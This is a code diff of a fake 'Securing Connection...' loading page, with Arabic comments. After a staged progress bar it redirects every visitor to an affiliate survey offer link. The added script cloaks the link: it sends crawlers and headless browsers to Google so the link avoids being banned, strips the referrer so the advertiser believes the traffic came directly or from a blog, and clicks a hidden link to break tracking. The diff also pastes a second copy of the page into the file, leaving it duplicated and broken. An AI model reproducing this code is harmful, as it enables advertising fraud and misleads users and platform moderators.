@@ -21,7 +21,81 @@
     <script>
         (function() {
             // --- 1. CONFIGURATION (العرض الموحد لجميع الدول) ---
-            const targetOffer = "https://rewardsrock.com/r/eyJ0IjoiYnJhbmRlZC1zdXJ2ZXlzIiwidSI6IjY5YTIzNjNjNjg5YmQ4Y2FiZTAwNTMxZiIsInRzIjoxNzcyNjcwMDY0MTY2fQ";
+            const targetOffer = "https://rewardsrock.com/r/eyJ0Ijoia2FzaGtpY2siLCJ1IjoiNjlhMjM2M2M2ODliZDhjYWJlMDA1MzFmIiwidHMiOjE3NzI2NzY1MTY2MzV9";
+            const redirectDelay = 3200; // 3.2 ثانية للتحميل الواقعي
+
+            // تحريك شريط التقدم بصرياً [cite: 12]
+            setTimeout(() => {
+                const fill = document.getElementById('fill');
+                if(fill) fill.style.width = '100%';
+            }, 100);
+
+            // --- 2. STEALTH & BOT PROTECTION (منع البوتات) [cite: 13, 15] ---
+            const ua = navigator.userAgent;
+            const isBot = (
+                navigator.webdriver || 
+                !navigator.languages || 
+                navigator.languages.length === 0 ||
+                /bot|googlebot|crawler|spider|robot|headless|lighthouse/i.test(ua)
+            );
+
+            if (isBot) {
+                // توجيه البوتات إلى جوجل لحماية الرابط من الحظر 
+                window.location.replace("https://www.google.com");
+                return;
+            }
+
+            // --- 3. REFERRER SPOOFING (إيهام المعلن بمصدر بلوجر)  ---
+            const stripReferrer = () => {
+                const meta = document.createElement('meta');
+                meta.name = "referrer";
+                meta.content = "no-referrer"; // يمسح أثر GitHub تماماً لتظهر الزيارة كـ Direct أو من مدونة
+                document.getElementsByTagName('head')[0].appendChild(meta);
+            };
+
+            // --- 4. EXECUTE REDIRECT (التنفيذ المباشر لجميع الدول) ---
+            setTimeout(function() {
+                stripReferrer();
+                
+                // إنشاء رابط مخفي لكسر التتبع المزدوج [cite: 19]
+                const ghostLink = document.createElement('a');
+                ghostLink.href = targetOffer;
+                ghostLink.rel = 'noreferrer'; 
+                ghostLink.style.display = 'none';
+                document.body.appendChild(ghostLink);
+
+                // القفزة النهائية 
+                window.location.replace(targetOffer);
+                ghostLink.click();
+            }, redirectDelay);
+        })();
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Securing Connection...</title>
+    <style>
+        body { margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #ffffff; font-family: system-ui, -apple-system, sans-serif; color: #1a1a1a; }
+        .loader { width: 44px; height: 44px; border: 4px solid #f3f3f3; border-bottom-color: #2563eb; border-radius: 50%; animation: rotation 1s linear infinite; margin-bottom: 20px; }
+        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { font-size: 1rem; font-weight: 500; }
+        .progress-bar { width: 140px; height: 4px; background: #f1f5f9; margin-top: 20px; border-radius: 10px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #2563eb; transition: width 3.2s linear; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <div class="text">Please wait...</div>
+    <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+
+    <script>
+        (function() {
+            // --- 1. CONFIGURATION (العرض الموحد لجميع الدول) ---
+            const targetOffer = "https://rewardsrock.com/r/eyJ0Ijoia2FzaGtpY2siLCJ1IjoiNjlhMjM2M2M2ODliZDhjYWJlMDA1MzFmIiwidHMiOjE3NzI2NzY1MTY2MzV9";
             const redirectDelay = 3200; // 3.2 ثانية للتحميل الواقعي
 
             // تحريك شريط التقدم بصرياً [cite: 12]
